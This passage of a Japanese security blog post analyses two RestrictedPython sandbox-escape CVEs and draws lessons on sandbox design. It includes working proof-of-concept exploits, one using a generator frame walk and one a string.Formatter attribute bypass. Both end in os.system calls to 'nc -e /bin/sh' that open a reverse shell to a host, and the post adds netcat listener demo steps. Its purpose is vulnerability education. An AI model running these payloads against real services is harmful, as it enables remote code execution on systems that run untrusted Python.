+<p>Sandbox環境 ( <code>exec()</code> 内) のグローバル空間にはRCEに繋がるようなオブジェクトが存在しない場合を考える。<br>この前提で、<strong>sandbox環境からスタックフレームを遡り、ホスト環境 ( <code>exec()</code> 呼び出し前) のグローバル空間を参照することで、RCEに繋がるオブジェクトへのアクセスを得る</strong>というのが本脆弱性の核心である。</p>
+<p><strong>Sandbox環境の中からスタックフレームを得る道筋を塞ぐのがRestrictedPython側の意図であったが、ジェネレーター関数から作成できるジェネレーターオブジェクトからはスタックフレームへの参照が生えていた</strong>ため、そこが攻撃ベクトルとなった。</p>
+<h4><span id="pocコード">PoCコード</span></h4><p><code>example/cve_2023_37271.py</code> の中身を記載する。コメントを読み、上述の原理と照らし合わせてほしい。<br>Sandbox escapeが成功したあとは、ホストのグローバル環境のフレームから <code>import</code> ビルトイン関数を取得し、 <code>import os; os.system(&#39;任意コード&#39;)</code> 相当のことをしている。<br>「任意コード」部分は、dockerコンテナ内からホストへ通信するためのドメイン <code>host.docker.internal</code> を使って、ホストの9999番ポートにreverse-shellを張りに行っている。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="comment"># ジェネレーター関数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">        <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ジェネレーターオブジェクト作成</span></span><br><span class="line">    g = gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># スタックフレームを取得し、1個遡る</span></span><br><span class="line">    g = (g.gi_frame.f_back <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更に遡る（sandboxを超えてホストのフレームに至る）</span></span><br><span class="line">    g = [f <span class="keyword">for</span> f <span class="keyword">in</span> g][<span class="number">0</span>].f_back.f_back</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ホストのフレームのビルトインから import を取得し、 `import os` 相当をする</span></span><br><span class="line">    os_ = g.f_builtins[<span class="string">&quot;__import__&quot;</span>](<span class="string">&quot;os&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># os.system() で任意コード実行</span></span><br><span class="line">    <span class="comment"># ここではホストで待機しているreverse-shellに接続しに行く</span></span><br><span class="line">    <span class="comment"># ホスト側実行コマンド例</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># ```bash</span></span><br><span class="line">    <span class="comment"># # Linux</span></span><br><span class="line">    <span class="comment"># nc -l -p 9999</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># # MacOS</span></span><br><span class="line">    <span class="comment"># nc -nvl 9999</span></span><br><span class="line">    <span class="comment"># ```</span></span><br><span class="line">    <span class="keyword">return</span> os_.system(<span class="string">&quot;nc -e /bin/sh host.docker.internal 9999&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4><span id="デモ動画とpoc実行手順">デモ動画とPoC実行手順</span></h4><iframe width="800" height="500" src="https://www.youtube.com/embed/JxJOSLlbG58?si=F-oklZwr-MaI9uH3" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<hr>
+<p><strong>コンテナ内でのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python実行サーバー起動（攻撃が再現するバージョンを指定）</span></span><br><span class="line">./run-server.sh 6.0</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>ホストマシンでのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">別シェルで、reverse-shell待機</span></span><br><span class="line">nc -l -p 9999  # MacOSだと nc -nvl 9999</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">---</span></span><br><span class="line"></span><br><span class="line">cd dp-system-research/demo/RestrictedPython-CVE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PoCコード投入</span></span><br><span class="line">nc localhost 6000 &lt; ./example/cve_2023_37271.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">---</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先程の別シェルで、サーバーサイドのシェル操作ができるようになっている</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash"><span class="built_in">uname</span> -a</span></span><br><span class="line">Linux 6b9a20d3e2ad 6.6.22-linuxkit #1 SMP Fri Mar 29 12:21:27 UTC 2024 aarch64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<h3><span id="cve-2023-41039-stringformatter-の書式文字列内でのアトリビュートアクセスのサニタイズ漏れ筆者命名">CVE-2023-41039: string.Formatter() の書式文字列内でのアトリビュートアクセスのサニタイズ漏れ（筆者命名）</span></h3><h4><span id="原理">原理</span></h4><p><strong>TL;DR</strong></p>
+<ul>
+<li><strong><code>_</code> の付いたアトリビュートへのアクセス</strong>、RestrictedPythonで禁止していたはずだが、 <strong><code>string.Formatter().format()</code> を使うことでバイパスできた</strong><ul>
+<li>→ <code>random.Random.__init__</code> を経由し、 <code>os.system</code> にたどり着ける</li>
+</ul>
+</li>
+<li><code>os.system</code> を引数付きで呼び出すために、 <code>string.Formatter</code> を継承したクラスを作って一工夫</li>
+</ul>
+<hr>
+<p>RestrictedPythonに与えるユーザーコードでは <code>a.b</code> のような直接的なアトリビュートアクセスや、 <code>_</code> から始まるアトリビュートアクセスが軒並み禁じられており、従ってsandbox escapeに繋がるようなコードが書きづらくなっている。</p>
+<p>しかし、 <strong><code>string.Formatter().format()</code> を巧みに使うとこれをバイパス</strong>できる。<code>string.Formatter().format(&quot;&#123;0._someUnderscoredAttr_&#125;&quot;, obj0)</code> は、 <code>str(obj0._someUnderscoredAttr_)</code> と同様の意味になる。後者のコードはRestrictedPythonで禁止されているが、前者は禁じられていない。</p>
+<p>この挙動を利用し、<strong>なんとか <code>os.system(&#39;reverse-shellコマンド&#39;)</code> を実行したい。</strong></p>
+<p>os のオブジェクトさえ獲得できれば、 <code>string.Formatter().format(&quot;&#123;0.system&#125;&quot;, os)</code> とすることで <code>str(os.system)</code> までは至る。まずはここを目指す。</p>
+<p>ユーザーコードの中では <code>random</code> モジュールが使える。これは <code>restricted_python_cve/run_server.py</code> の中で <code>policy_globals = &#123;**safe_globals,**utility_builtins&#125;</code> としているのが肝で、この <code>utility_builtins</code> の中に <code>random</code> モジュールが含まれているためである。</p>
+<p><code>random</code> モジュールのコードの中に、 <code>import os as _os</code> としている箇所がある。</p>
+<img src="/img/2024/12-17/random-import-os.png" alt="randomモジュールで import os している箇所" width="800px" height="auto">
+
+<p>従って、 <code>random</code> モジュール内から <code>_os</code> オブジェクトをたどることができる。具体的には:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.Formatter().<span class="built_in">format</span>(<span class="string">&quot;&#123;0.Random.__init__.__globals__[_os]&#125;&quot;</span>, random)</span><br><span class="line"><span class="string">&quot;&lt;module &#x27;os&#x27; from &#x27;/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/os.py&#x27;&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>ここまでで <code>os</code> モジュールまで手に入れたので、あとは <code>os.system(&#39;cat /etc/passwd&#39;)</code> でも試したくなる。しかしここまでの方法では、 <code>system</code> 関数にアクセスはできても関数呼び出しができない。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.Formatter().<span class="built_in">format</span>(<span class="string">&quot;&#123;0.Random.__init__.__globals__[_os].system&#125;&quot;</span>, random)</span><br><span class="line"><span class="string">&#x27;&lt;built-in function system&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.Formatter().<span class="built_in">format</span>(<span class="string">&quot;&#123;0.Random.__init__.__globals__[_os].system(&#x27;cat /etc/passwd&#x27;)&#125;&quot;</span>, random)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/string.py&quot;</span>, line <span class="number">161</span>, <span class="keyword">in</span> <span class="built_in">format</span></span><br><span class="line">    <span class="keyword">return</span> self.vformat(format_string, args, kwargs)</span><br><span class="line">  File <span class="string">&quot;/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/string.py&quot;</span>, line <span class="number">165</span>, <span class="keyword">in</span> vformat</span><br><span class="line">    result, _ = self._vformat(format_string, args, kwargs, used_args, <span class="number">2</span>)</span><br><span class="line">  File <span class="string">&quot;/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/string.py&quot;</span>, line <span class="number">205</span>, <span class="keyword">in</span> _vformat</span><br><span class="line">    obj, arg_used = self.get_field(field_name, args, kwargs)</span><br><span class="line">  File <span class="string">&quot;/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/string.py&quot;</span>, line <span class="number">276</span>, <span class="keyword">in</span> get_field</span><br><span class="line">    obj = <span class="built_in">getattr</span>(obj, i)</span><br><span class="line">AttributeError: module <span class="string">&#x27;os&#x27;</span> has no attribute <span class="string">&#x27;system(&#x27;</span>cat /etc/passwd<span class="string">&#x27;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>そこで、 <code>string.Formatter</code> クラスを継承し、クラス内のメソッドを定義することで引数（ <code>&#39;cat /etc/passwd&#39;</code> ）付きの関数呼び出しを実現する。<br><code>string.Formatter</code> の定義を以下に抜粋:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Formatter</span>:</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="comment"># given a field_name, find the object it references.</span></span><br><span class="line">    <span class="comment">#  field_name:   the field being looked up, e.g. &quot;0.name&quot;</span></span><br><span class="line">    <span class="comment">#                 or &quot;lookup[3]&quot;</span></span><br><span class="line">    <span class="comment">#  used_args:    a set of which args have been used</span></span><br><span class="line">    <span class="comment">#  args, kwargs: as passed in to vformat</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_field</span>(<span class="params">self, field_name, args, kwargs</span>):</span><br><span class="line">        first, rest = _string.formatter_field_name_split(field_name)</span><br><span class="line">        obj = self.get_value(first, args, kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># loop through the rest of the field_name, doing</span></span><br><span class="line">        <span class="comment">#  getattr or getitem as needed</span></span><br><span class="line">        <span class="keyword">for</span> is_attr, i <span class="keyword">in</span> rest:</span><br><span class="line">            <span class="keyword">if</span> is_attr:</span><br><span class="line">                obj = <span class="built_in">getattr</span>(obj, i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                obj = obj[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> obj, first</span><br></pre></td></tr></table></figure>
+
+<p><code>obj</code> が、 <code>string.Formatter().format(&quot;&#123;0.Random.__init__.__globals__[_os].system&#125;&quot;, random)</code> における <code>system</code> となる。<br>ということで、継承したクラスでその <code>obj</code> を引数付きで呼び出せば目的達成。この方針で書いたコードが次のPoCとなる。</p>
+<h4><span id="pocコード">PoCコード</span></h4><p><code>example/cve_2023_41039.py</code> の中身を記載する。コメントを読み、上述の原理と照らし合わせてほしい。<br><code>os.system</code> の呼び出しで行っているRCEによるReverse-shellは、上述の CVE-2023-37271 のPoCコードと全く同じ考えなので、そちらも参照。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># `string` は、ホスト側の `policy_globals = &#123;**safe_globals, **utility_builtins&#125;`</span></span><br><span class="line">    <span class="comment"># により使えるようになっている`</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MyFormatter</span>(string.Formatter):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_field</span>(<span class="params">self, field_name, args, kwargs</span>):</span><br><span class="line">            <span class="comment"># sandbox内のグローバルには `super` がないので回りくどい呼び出しをする</span></span><br><span class="line">            obj, first = string.Formatter.get_field(self, field_name, args, kwargs)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># `string.Formatter.format(&quot;&#123;0.Random.__init__.__globals__[_os].system&#125;&quot;, random)</span></span><br><span class="line">            <span class="comment"># とした場合、最後の `system` 関数のオブジェクトが `obj` に入っている</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># `obj == os.system` を仮定し、 system() で任意コード実行</span></span><br><span class="line">            <span class="comment"># ここではホストで待機しているreverse-shellに接続しに行く</span></span><br><span class="line">            <span class="comment"># ホスト側実行コマンド例</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            <span class="comment"># ```bash</span></span><br><span class="line">            <span class="comment"># # Linux</span></span><br><span class="line">            <span class="comment"># nc -l -p 9999</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            <span class="comment"># # MacOS</span></span><br><span class="line">            <span class="comment"># nc -nvl 9999</span></span><br><span class="line">            <span class="comment"># ```</span></span><br><span class="line">            obj(<span class="string">&quot;nc -e /bin/sh host.docker.internal 9999&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> obj, first</span><br><span class="line"></span><br><span class="line">    <span class="comment"># `random` は、ホスト側の `policy_globals = &#123;**safe_globals, **utility_builtins&#125;`</span></span><br><span class="line">    <span class="comment"># により使えるようになっている`</span></span><br><span class="line">    MyFormatter().<span class="built_in">format</span>(<span class="string">&quot;&#123;0.Random.__init__.__globals__[_os].system&#125;&quot;</span>, random)</span><br></pre></td></tr></table></figure>
+
+<h4><span id="デモ動画とpoc実行手順">デモ動画とPoC実行手順</span></h4><iframe width="800" height="500" src="https://www.youtube.com/embed/FApgqAJBNi0?si=ki4wwaxz40pxJPWu" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<hr>
+<p><strong>コンテナ内でのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python実行サーバー起動（攻撃が再現するバージョンを指定）</span></span><br><span class="line">./run-server.sh 6.1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>ホストマシンでのコマンド</strong></p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">別シェルで、reverse-shell待機</span></span><br><span class="line">nc -l -p 9999  # MacOSだと nc -nvl 9999</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">---</span></span><br><span class="line">cd dp-system-research/demo/RestrictedPython-CVE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PoCコード投入</span></span><br><span class="line">nc localhost 6000 &lt; ./example/cve_2023_41039.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">---</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">別シェルで、サーバーサイドのシェル操作ができるようになっている</span></span><br><span class="line">uname -a</span><br><span class="line">Linux 6b9a20d3e2ad 6.6.22-linuxkit #1 SMP Fri Mar 29 12:21:27 UTC 2024 aarch64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<h2><span id="takeaway">Takeaway</span></h2><h3><span id="何が起きていたか">何が起きていたか？</span></h3><p>RestrictedPythoonの2つのCVEについて詳説し、RCEを悪用してReverse-shellを獲得するデモを提供した。</p>
+<p>それぞれのCVEの原因を振り返る:</p>
+<ul>
+<li>CVE-2023-37271<ul>
+<li><strong>前提</strong>: スタックフレームにアクセスされると、遡上してsandbox escapeできてしまう</li>
+<li><strong>開発者の意図</strong>: スタックフレームへのアクセスを<strong>塞ぐ</strong></li>
+<li><strong>攻撃の切り口</strong>: ジェネレーターオブジェクトからスタックフレームにアクセスできた</li>
+</ul>
+</li>
+<li>CVE-2023-41039<ul>
+<li><strong>前提</strong>: <strong>init</strong> などの関数オブジェクトを辿れると os などの危険なビルトインモジュールにアクセスされてしまう</li>
+<li><strong>開発者の意図</strong>: _ で始まるアトリビュートへのアクセスを<strong>塞ぐ</strong></li>
+<li><strong>攻撃の切り口</strong>: string.Formatter.format() の書式文字列を使って _ で始まるアトリビュートへアクセスできた</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>非常に大雑把に言うと、</p>
+<ul>
+<li>防御側: <strong>＜大事な資産＞</strong> にアクセスされないように <strong>＜資産への道筋＞</strong> を塞ぐ</li>
+<li>攻撃側: <strong>＜大事な資産＞</strong> にアクセスするため、塞がれていない別の <strong>＜資産への道筋＞</strong> を探す</li>
+</ul>
+<p>という構図と言える。全ての脆弱性がこういう構図なわけではないにせよ、頻繁に見受けられる構図である。</p>
+<h3><span id="更に歴史に学ぶ">更に歴史に学ぶ</span></h3><p>RestrictedPythonよりも昔に、同じようにPythonのsandbox環境を志向したpysandboxというOSSがあった。</p>
+<div style="text-align: center">
+  <div class="github-card" data-user="vstinner" data-repo="pysandbox" data-height="200" data-width="400" data-theme="default" data-target data-client-id data-client-secret></div>
+</div>
+<script src="/github-card-lib/githubcard.js"></script>
+
+
+<p>そしてpysandboxは、<a target="_blank" rel="noopener" href="https://lwn.net/Articles/574215/">LWN.netの投稿</a> で総括されているように、 <strong>「デザインから壊れていた」</strong> ことを認めている。この投稿での指摘を抽出すると以下になる。</p>
+<ul>
+<li><strong>セキュリティ上の根本的な問題</strong><ul>
+<li><strong>Pythonの言語機能（特にintrospection）により、サンドボックスから脱出する方法が多数存在</strong>する</li>
+<li>CPythonの巨大なコードベース（126,000行以上）全体がセキュリティリスクとなる</li>
+<li>単一のバグでサンドボックス全体が破られる可能性がある</li>
+</ul>
+</li>
+<li>実用性の喪失<ul>
+<li>セキュリティ制限により、単純な計算以外ほぼ何もできなくなった</li>
+<li><strong>多くの基本的な言語機能を削除せざるを得なかった</strong></li>
+</ul>
+</li>
+</ul>
+<h3><span id="restrictedpythonの脆弱性は出尽くしたか">RestrictedPythonの脆弱性は出尽くしたか？</span></h3><p>ここまでの議論を読めば、「まだ報告されてないだけで穴はあるはず」「攻撃者は1つでも穴を見つければ良い」という考えになるかと思う（筆者も同じ考え）。</p>
+<p>攻撃者は時に「どうしてそんなの思いつくの…」と途方に暮れるような攻撃を考えるものである。Pythonのsandbox escapeのテクニックをまとめたページを紹介するので、是非ご一読いただきたい。</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">Bypass Python sandboxes - HackTricks</a></p>
+<h3><span id="セキュアな言語sandboxの作り方に関する総括">セキュアな言語Sandboxの作り方に関する総括</span></h3><p>セキュリティを志向した言語Sandbox環境の作り方の大方針として、筆者の考えをまとめる。</p>
+<ul>
+<li><strong>[無理筋] 大きな言語機能の上に、小さなサブセットとしてsandboxを作る</strong><ul>
+<li>大きな言語機能のたった一つでもsandbox escapeに使われたらアウト</li>
+<li>しかも言語機能側は勝手に拡張されていくので追従は事実上不可</li>
+</ul>
+</li>
+<li><strong>[進むべき道] 小さな言語機能（sandboxとして動作）の上に、大きな言語機能を乗せて利便を拡張</strong></li>
+</ul>
+
+    
+  </div>
+  <footer class="entry-footer">
+    <div class="entry-meta-footer">
+      <span class="category">
+        
+      </span>
+      <span class="tags">
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/" rel="tag">セキュリティ</a></li></ul>
+
+      </span>
+    </div>
+  </footer>
+  
+  <footer class="author-info clearfix">
+    <img class="author-picture circle" src="https://www.gravatar.com/avatar/cb02a2b3f429b7c938d1fe2665e8e342">
+    <div class="author-content right">
+      <div class="author-caption">
+        <span class="label">author</span>
+        Sho Nakatani a.k.a. laysakura
+      </div>
+      <p class="author-description">
+        JTCのプリンシパル・リサーチャーとして、セキュリティ・プライバシー・データ基盤に関する研究開発に従事。<br>
+        CISSP/OSCP/BSCP/情報処理安全確保支援士(合格) 等の資格保有。CTF上位入賞多数。
+        セキュリティ関連の執筆・講演活動も行っている。<br>
+        （<a target="_blank" rel="noopener" href="https://github.com/laysakura/resume-jp">詳細プロフィール</a>）
+      </p>
+      <ul class="author-social-buttons">
+        <li class="author-social-button"><a class="fa fa-lg fa-twitter-square" target="_blank" rel="noopener" href="https://twitter.com/laysakura"></a>
+        </li>
+        <li class="author-social-button"><a class="fa fa-lg fa-github-square" target="_blank" rel="noopener" href="https://github.com/laysakura"></a>
+        </li>
+      </ul>
+    </div>
+  </footer>
+  
+  
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2024/12/02/threat-modeling-for-software-research/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">
+        
+          ソフトウェア研究における脅威モデリング（Cyber-sec+ Advent Calendar 2024）
+        
+      </div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+<section id="comments">
+  <div id="disqus_thread">
+
+    <!-- comment service provided by disqus -->
+    <script>
+      /**
+       *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+       *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+       */
+      var disqus_config = function () {
+        this.page.url = https://laysakura.github.io/2024/12/17/RestrictedPython-CVE/;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = https://laysakura.github.io/2024/12/17/RestrictedPython-CVE/; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+      };
+      (function () {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+
+        s.src = '//laysakura.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      })();
+    </script>
+
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+        Disqus.</a></noscript>
+  </div>
+</section>
+
+
+    </div>
+    <div class="mb-search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:laysakura.github.io">
+  </form>
+</div>
+<footer id="footer">
+	<h1 class="footer-blog-title">
+		<a href="/">俺とお前とlaysakura</a>
+	</h1>
+	<span class="copyright">
+		&copy; 2024 Sho Nakatani a.k.a. laysakura<br>
+		Modify from <a href="https://sanographix.github.io/tumblr/apollo/" target="_blank">Apollo</a> theme, designed by <a href="https://www.sanographix.net/" target="_blank">SANOGRAPHIX.NET</a><br>
+		Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+	</span>
+</footer>
+
+    
+<script>
+  var disqus_shortname = 'laysakura';
+  
+  var disqus_url = 'https://laysakura.github.io/2024/12/17/RestrictedPython-CVE/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+
+  <!-- https://github.com/vfeskov/vanilla-back-to-top -->
+  <script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+  <script>addBackToTop({
+    diameter: 50,
+    backgroundColor: '#33a6b880',
+    textColor: '#fff'
+  })</script>
+
+</body>
+</html>
